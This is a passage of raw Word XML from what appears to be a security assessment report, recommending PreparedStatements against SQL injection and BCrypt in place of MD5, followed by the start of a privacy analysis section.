          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="008231A3">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>. With this method, the SQL query is defined once with placeholders (?) instead of values, which are then set separately. Therefore, even if the input contained special characters or SQL statements, they would simply be treated as data and could not be executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09341842" w14:textId="1D35B620" w:rsidR="001E79DD" w:rsidRPr="00186DB0" w:rsidRDefault="00186DB0" w:rsidP="00186DB0">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">This method provides good protection against SQL injection attacks, as well as improving code readability and maintainability. Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>PreparedStatements</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00186DB0">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a well-established best practice for building secure, database-driven applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D246CC" w14:textId="77777777" w:rsidR="001E79DD" w:rsidRDefault="000A5824" w:rsidP="001E79DD">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00771331">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="325C7F01" wp14:editId="218119EA">
            <wp:extent cx="5733415" cy="704215"/>
            <wp:effectExtent l="0" t="0" r="635" b="635"/>
            <wp:docPr id="53" name="Im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3415" cy="704215"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19919E94" w14:textId="375482B5" w:rsidR="000A5824" w:rsidRDefault="001E79DD" w:rsidP="001E79DD">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="165" w:name="_Ref200039785"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>48</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="165"/>
      <w:r>
        <w:t>: SQL-Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC35175" w14:textId="77777777" w:rsidR="001E79DD" w:rsidRDefault="001237B1" w:rsidP="001E79DD">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="008C5B3F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70B0F71A" wp14:editId="2C2F0B8E">
            <wp:extent cx="5733415" cy="1400175"/>
            <wp:effectExtent l="0" t="0" r="635" b="9525"/>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3415" cy="1400175"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5090F5" w14:textId="14BDF12E" w:rsidR="000A5824" w:rsidRPr="000A5824" w:rsidRDefault="001E79DD" w:rsidP="001E79DD">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="166" w:name="_Ref200039831"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>49</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="166"/>
      <w:r>
        <w:t xml:space="preserve">: Mitigate </w:t>
      </w:r>
      <w:r w:rsidRPr="006B5415">
        <w:t>SQL-Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362EA94A" w14:textId="13B32E22" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:rPr>
          <w:del w:id="167" w:author="Microsoft Word" w:date="2025-06-04T17:36:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="168" w:author="Microsoft Word" w:date="2025-06-04T17:36:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Unchecked Return Value</w:delText>
        </w:r>
        <w:bookmarkStart w:id="169" w:name="_Toc200039326"/>
        <w:bookmarkEnd w:id="169"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="391DD164" w14:textId="5809CCCF" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:rPr>
          <w:del w:id="170" w:author="Microsoft Word" w:date="2025-06-04T17:36:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="171" w:author="Microsoft Word" w:date="2025-06-04T17:36:00Z">
        <w:r w:rsidRPr="005432B6">
          <w:delText>Unreleased Resource: Streams</w:delText>
        </w:r>
        <w:bookmarkStart w:id="172" w:name="_Toc200039327"/>
        <w:bookmarkEnd w:id="172"/>
      </w:del>
    </w:p>
    <w:p w14:paraId="57525E80" w14:textId="44DC71E2" w:rsidR="00910649" w:rsidRPr="00D33DC7" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="173" w:name="_Toc200039328"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Weak Cryptographic Hash</w:t>
      </w:r>
      <w:bookmarkEnd w:id="173"/>
    </w:p>
    <w:p w14:paraId="6A0381A4" w14:textId="6C8E1F93" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>calculateHash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>' function (</w:t>
      </w:r>
      <w:r w:rsidR="00987EA1">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00987EA1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860633 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00987EA1">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00987EA1">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) is unused throughout the code, so it does not lead to any security issues relating to passwords or anything else you wanted to hide using MD5.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1569628D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>If the function were to be used elsewhere in the code, the methodology for calculating the hash would need to be changed, as MD5 is vulnerable to collisions (two different inputs can produce the same MD5 hash), has no built-in salting (meaning it does not protect against attacks involving tables that pre-calculate common hashes for millions of passwords) and is very fast (meaning an attacker could try billions of hashes per second using brute-force or dictionary attacks).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F67C7E" w14:textId="235E3F4B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">One solution would be to replace it with a slow salting algorithm such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>BCrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00D464C1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00D464C1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199867195 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00D464C1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00D464C1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00D464C1">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>). This would be more secure as it accounts for modern threats, including brute-force attacks, rainbow tables and accelerated hardware. However, it is slower, so it would be impractical to test millions of passwords per second. It also uses automatic skipping, so even if two users have the same password, the generated hashes will be different.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756AE3A1" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">When a user enters a password such as 'ciaociao123', </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B9995D" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Adds a random value called a 'salt', which is used to make each hash unique, even if two users have the same password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B859502" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>It then applies the algorithm several times, a process known as the 'cost' or 'work factor'. This step can be repeated thousands of times to slow down the calculation process. The higher the cost factor, the longer it takes to generate the hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC38FB5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Finally, it returns a hash that contains the salt and the number of repetitions used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486F6AD7" w14:textId="77777777" w:rsidR="00987EA1" w:rsidRDefault="00D33DC7" w:rsidP="00987EA1">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="2B693177" wp14:editId="7BD7A24F">
            <wp:extent cx="4029820" cy="555606"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31" name="image28.png" descr="A black background with white text&#10;&#10;AI-generated content may be incorrect."/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="31" name="image28.png" descr="A black background with white text&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId74"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4029820" cy="555606"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB3B1F1" w14:textId="3766BC5C" w:rsidR="00D33DC7" w:rsidRDefault="00987EA1" w:rsidP="00987EA1">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="174" w:name="_Ref199860633"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="174"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00725CE0">
        <w:t>Weak Cryptographic Hash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F27D4C" w14:textId="77777777" w:rsidR="00D33DC7" w:rsidRPr="00D33DC7" w:rsidRDefault="00D33DC7" w:rsidP="00D33DC7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67E4D4E1" w14:textId="77777777" w:rsidR="00D464C1" w:rsidRDefault="001A39A9" w:rsidP="00D464C1">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="339A1DE8" wp14:editId="07777777">
            <wp:extent cx="4143465" cy="1293972"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="23"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75"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4143465" cy="1293972"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8A2C19" w14:textId="1EA48291" w:rsidR="007570E7" w:rsidRDefault="00D464C1" w:rsidP="00D464C1">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="175" w:name="_Ref199867195"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>51</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="175"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F32499">
        <w:t>BCrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="36A418F8" w14:textId="77777777" w:rsidR="007570E7" w:rsidRPr="007570E7" w:rsidRDefault="007570E7" w:rsidP="007570E7">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="440597E2" w14:textId="1BF07A5E" w:rsidR="008C5B3F" w:rsidRDefault="008C5B3F" w:rsidP="003D59ED">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56F75370" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="176" w:name="_Toc200039329"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>PRIVACY ANALYSIS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="176"/>
    </w:p>
    <w:p w14:paraId="476F428B" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="177" w:name="_Toc200039330"/>
      <w:r w:rsidRPr="4E46F641">
        <w:t xml:space="preserve">Privacy </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:t>Assessment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="177"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5ACC9372" w14:textId="55288CFA" w:rsidR="00445E86" w:rsidRPr="00445E86" w:rsidRDefault="00445E86" w:rsidP="00445E86">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Ide</w:t>
      </w:r>
      <w:r w:rsidRPr="00445E86">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ntify privacy design strategies for system re-engineering in according to the Privacy Knowledge Base</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Rimandonotaapidipagina"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:footnoteReference w:id="2"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75415F9E" w14:textId="77777777" w:rsidR="00445E86" w:rsidRPr="00445E86" w:rsidRDefault="00445E86" w:rsidP="00445E86">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00445E86">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Identify privacy patterns that implement the strategies following the website https://privacypatterns.org/patterns/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF4E37C" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="00445E86" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44FB30F8" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="00445E86" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DA6542E" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="00445E86" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3041E394" w14:textId="301D0EF7" w:rsidR="00910649" w:rsidRPr="00445E86" w:rsidRDefault="00910649">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00910649" w:rsidRPr="00445E86">
      <w:headerReference w:type="default" r:id="rId76"/>
      <w:footerReference w:type="default" r:id="rId77"/>
      <w:headerReference w:type="first" r:id="rId78"/>
      <w:footerReference w:type="first" r:id="rId79"/>
      <w:pgSz w:w="11909" w:h="16834"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="144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E9AA581" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="5E756545" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="15C3E415" w14:textId="77777777" w:rsidR="00A23FFF" w:rsidRDefault="00A23FFF">
      <w:pPr>
        <w:spacing w:before="0"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ucida Sans">
    <w:panose1 w:val="020B0602030504020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="00000003" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="00000001" w:csb1="00000000"/>
    <w:embedRegular r:id="rId1" w:fontKey="{6FCF2654-87FC-4AB6-8E81-D20F7C97A78C}"/>
    <w:embedBold r:id="rId2" w:fontKey="{63069A24-BE0A-4119-B1D4-DEE4363645E1}"/>
    <w:embedItalic r:id="rId3" w:fontKey="{58E2371E-B22A-4550-BA55-8C3CA4B15D33}"/>
    <w:embedBoldItalic r:id="rId4" w:fontKey="{33AE088E-956F-4068-A3A4-07DAAD279B7A}"/>
  </w:font>
  <w:font w:name="Arial">
    <w:panose1 w:val="020B0604020202020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E0002EFF" w:usb1="C000785B" w:usb2="00000009" w:usb3="00000000" w:csb0="000001FF" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Lucida Sans Unicode">
    <w:panose1 w:val="020B0602030504020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="80000AFF" w:usb1="0000396B" w:usb2="00000000" w:usb3="00000000" w:csb0="000000BF" w:csb1="00000000"/>
    <w:embedRegular r:id="rId5" w:fontKey="{070682F2-31DC-47F1-931B-C7C392C25E00}"/>
  </w:font>
  <w:font w:name="Calibri">
    <w:panose1 w:val="020F0502020204030204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E4002EFF" w:usb1="C200247B" w:usb2="00000009" w:usb3="00000000" w:csb0="000001FF" w:csb1="00000000"/>
    <w:embedRegular r:id="rId6" w:fontKey="{ACA32270-6748-40EC-B206-2B2977AB69A1}"/>
  </w:font>
  <w:font w:name="MS Gothic">
    <w:altName w:val="ＭＳ ゴシック"/>
    <w:panose1 w:val="020B06090702050802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embedRegular r:id="rId7" w:fontKey="{61D5C859-255D-4C24-AB7F-05D071C8B36C}"/>
  </w:font>
  <w:font w:name="Cambria Math">
    <w:panose1 w:val="02040503050406030204"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E00006FF" w:usb1="420024FF" w:usb2="02000000" w:usb3="00000000" w:csb0="0000019F" w:csb1="00000000"/>
    <w:embedRegular r:id="rId8" w:fontKey="{19712CCD-6A1F-4CE0-8BC1-E0CB182190FA}"/>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embedRegular r:id="rId9" w:fontKey="{B37CBFFF-2D80-4C31-967C-9A43C499B9CA}"/>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745020" w14:textId="31B544E3" w:rsidR="00910649" w:rsidRDefault="4E46F641" w:rsidP="4E46F641">
    <w:pPr>
      <w:pBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="000000"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="right" w:pos="8280"/>
        <w:tab w:val="right" w:pos="8364"/>
      </w:tabs>
      <w:ind w:firstLine="284"/>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
        <w:lang w:val="it-IT"/>
      </w:rPr>
    </w:pPr>
    <w:proofErr w:type="spellStart"/>
    <w:r w:rsidRPr="4E46F641">
      <w:rPr>
